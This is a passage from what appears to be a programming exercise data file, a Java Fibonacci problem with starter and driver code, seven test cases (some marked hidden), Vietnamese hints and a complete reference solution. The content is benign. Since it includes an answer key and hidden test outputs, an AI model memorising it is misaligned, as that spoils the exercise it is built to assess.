      "starterCode": "public class Solution {\n    public int fib(int n) {\n        // Quy hoạch động O(N) thời gian, O(1) bộ nhớ\n        \n        return 0;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int n = sc.nextInt();\n            Solution sol = new Solution();\n            System.out.print(sol.fib(n));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "2",
          "expectedOutput": "1",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "3",
          "expectedOutput": "2",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "4",
          "expectedOutput": "3",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "0",
          "expectedOutput": "0",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "1",
          "expectedOutput": "1",
          "isHidden": true
        },
        {
          "id": 6,
          "input": "10",
          "expectedOutput": "55",
          "isHidden": true
        },
        {
          "id": 7,
          "input": "30",
          "expectedOutput": "832040",
          "isHidden": true
        }
      ],
      "hints": [
        "Nếu n <= 1, return n.",
        "Dùng 2 biến a = 0, b = 1. Lặp từ 2 đến n: c = a + b; a = b; b = c; return b."
      ],
      "solution": "public class Solution {\n    public int fib(int n) {\n        if (n <= 1) return n;\n        int a = 0, b = 1;\n        for (int i = 2; i <= n; i++) {\n            int c = a + b;\n            a = b;\n            b = c;\n        }\n        return b;\n    }\n}"
    }
  ]
};
